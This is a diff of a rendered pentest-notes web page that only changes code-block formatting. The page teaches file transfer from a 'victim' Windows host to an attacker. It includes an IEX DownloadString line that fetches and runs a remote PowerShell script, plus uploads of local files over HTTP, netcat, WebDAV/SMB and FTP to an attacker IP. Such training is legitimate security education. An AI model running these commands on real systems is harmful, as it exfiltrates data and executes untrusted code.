-<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo</span><span class="o">=</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>hosts
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>md5sum<span class="w"> </span>hosts<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span>
+<span class="normal"><a href="#__codelineno-17-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo</span><span class="o">=</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>hosts
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>md5sum<span class="w"> </span>hosts<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="powershell-systemnetwebclient_1">Powershell  <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a></h3>
 <h4 id="powershell-web-uploads">PowerShell Web Uploads</h4>
 <p>First, we launch a webserver in out attacker machine. We can use <a href="../uploadserver/">uploadserver</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Install a Configured WebServer with Upload</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>pip3<span class="w"> </span>install<span class="w"> </span>uploadserver
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Run web server</span>
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>python3<span class="w"> </span>-m<span class="w"> </span>uploadserver
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span>
+<span class="normal"><a href="#__codelineno-18-2">2</a></span>
+<span class="normal"><a href="#__codelineno-18-3">3</a></span>
+<span class="normal"><a href="#__codelineno-18-4">4</a></span>
+<span class="normal"><a href="#__codelineno-18-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="c1"># Install a Configured WebServer with Upload</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>pip3<span class="w"> </span>install<span class="w"> </span>uploadserver
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a><span class="c1"># Run web server</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>python3<span class="w"> </span>-m<span class="w"> </span>uploadserver
+</span></code></pre></div></td></tr></table></div>
 <p>From the victim's machine (windows), we will upload the file with Invoke-WebRequest:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c"># PowerShell Script to Upload a File to Python Upload Server</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class="p">)</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="nb">Invoke-FileUpload</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ipServer</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">upload</span> <span class="o">-File</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">etc</span><span class="p">\</span><span class="n">hosts</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span>
+<span class="normal"><a href="#__codelineno-19-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="c"># PowerShell Script to Upload a File to Python Upload Server</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="nb">Invoke-FileUpload</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ipServer</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">upload</span> <span class="o">-File</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">etc</span><span class="p">\</span><span class="n">hosts</span>
+</span></code></pre></div></td></tr></table></div>
 <h4 id="powershell-base64-web-upload">PowerShell Base64 Web Upload</h4>
 <p>Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nv">$b64</span> <span class="p">=</span> <span class="no">[System.convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">))</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ipServer</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Body</span> <span class="nv">$b64</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span>
+<span class="normal"><a href="#__codelineno-20-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="nv">$b64</span> <span class="p">=</span> <span class="no">[System.convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">))</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ipServer</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Body</span> <span class="nv">$b64</span>
+</span></code></pre></div></td></tr></table></div>
 <p>From the attacker machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8000</span>
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;<span class="w"> </span>hosts
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span>
+<span class="normal"><a href="#__codelineno-21-3">3</a></span>
+<span class="normal"><a href="#__codelineno-21-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="c1"># We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8000</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;<span class="w"> </span>hosts
+</span></code></pre></div></td></tr></table></div>
 <h3 id="smb-uploads">SMB Uploads</h3>
 <p>When Microsoft is preventing SMB traffic, there is an alternative: running SMB over HTTP with <code>WebDav</code>. <code>WebDAV</code> <a href="https://datatracker.ietf.org/doc/html/rfc4918">(RFC 4918)</a> is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The <code>WebDAV</code> protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. <code>WebDAV</code> can also use HTTPS.</p>
 <p>When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.</p>
 <h4 id="configuring-webdav-server">Configuring WebDav Server</h4>
 <p>To set up our <a href="../webdav-wsgidav/">WebDav server</a>, we need to install two Python modules, wsgidav and cheroot.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>pip<span class="w"> </span>install<span class="w"> </span>wsgidav<span class="w"> </span>cheroot
-</span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>sudo<span class="w"> </span>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--root<span class="o">=</span>/tmp<span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>pip<span class="w"> </span>install<span class="w"> </span>wsgidav<span class="w"> </span>cheroot
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>sudo<span class="w"> </span>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--root<span class="o">=</span>/tmp<span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <h4 id="connect-to-the-server-and-the-share-from-windows">Connect to the server and the share from windows</h4>
 <p>Now we can attempt to connect to the share using the <code>DavWWWRoot</code> directory.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c"># DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. </span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">lala</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="p">\\</span><span class="nv">$ipServer</span><span class="p">\</span><span class="n">DavWWWRoot</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="c"># Upload files with SMB</span>
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="nb">copy </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">SourceCode</span><span class="p">.</span><span class="n">zip</span> <span class="p">\\</span><span class="nv">$ipServer</span><span class="p">\</span><span class="n">DavWWWRoot</span><span class="p">\</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
+<span class="normal"><a href="#__codelineno-24-2">2</a></span>
+<span class="normal"><a href="#__codelineno-24-3">3</a></span>
+<span class="normal"><a href="#__codelineno-24-4">4</a></span>
+<span class="normal"><a href="#__codelineno-24-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="c"># DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. </span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">lala</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="p">\\</span><span class="nv">$ipServer</span><span class="p">\</span><span class="n">DavWWWRoot</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4"></a><span class="c"># Upload files with SMB</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5"></a><span class="nb">copy </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">SourceCode</span><span class="p">.</span><span class="n">zip</span> <span class="p">\\</span><span class="nv">$ipServer</span><span class="p">\</span><span class="n">DavWWWRoot</span><span class="p">\</span>
+</span></code></pre></div></td></tr></table></div>
 <p>If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p>
 <h3 id="ftp-uploads">FTP Uploads</h3>
 <h4 id="run-pyftpdlib-a-ftp-server">Run pyftpdlib, a FTP server</h4>
 <p>We will use module <a href="../pyftpdlib/">pyftpdlib</a>,  with the option <code>--write</code> to allow clients to upload files to our attack host.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
+</span></code></pre></div></td></tr></table></div>
 <h4 id="create-a-command-file-for-the-ftp-client-to-upload-a-file">Create a Command File for the FTP Client to Upload a File</h4>
 <p>Example:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>C:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
-</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
-</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>C:\htb&gt; ftp -v -n -s:ftpcommand.txt
-</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>ftp&gt; open 192.168.49.128
-</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>
-</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>Log in with USER and PASS first.
-</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>
-</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>
-</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>ftp&gt; USER anonymous
-</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
-</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>ftp&gt; bye
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-26-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-26-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-26-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-26-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-26-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-26-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-26-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-26-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-26-10">10</a></span>
+<span class="normal"><a href="#__codelineno-26-11">11</a></span>
+<span class="normal"><a href="#__codelineno-26-12">12</a></span>
+<span class="normal"><a href="#__codelineno-26-13">13</a></span>
+<span class="normal"><a href="#__codelineno-26-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a>C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3"></a>C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4"></a>C:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5"></a>C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6"></a>C:\htb&gt; ftp -v -n -s:ftpcommand.txt
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7"></a>ftp&gt; open 192.168.49.128
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8"></a>
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9"></a>Log in with USER and PASS first.
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10"></a>
+</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11"></a>
+</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12"></a>ftp&gt; USER anonymous
+</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13"></a>ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
+</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14"></a>ftp&gt; bye
+</span></code></pre></div></td></tr></table></div>
 <h4 id="powershell-upload-file">PowerShell Upload File</h4>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">UploadFile</span><span class="p">(</span><span class="s1">&#39;ftp://192.168.49.128/ftp-hosts&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span><span class="p">)</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">UploadFile</span><span class="p">(</span><span class="s1">&#39;ftp://192.168.49.128/ftp-hosts&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17918,7 +18041,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
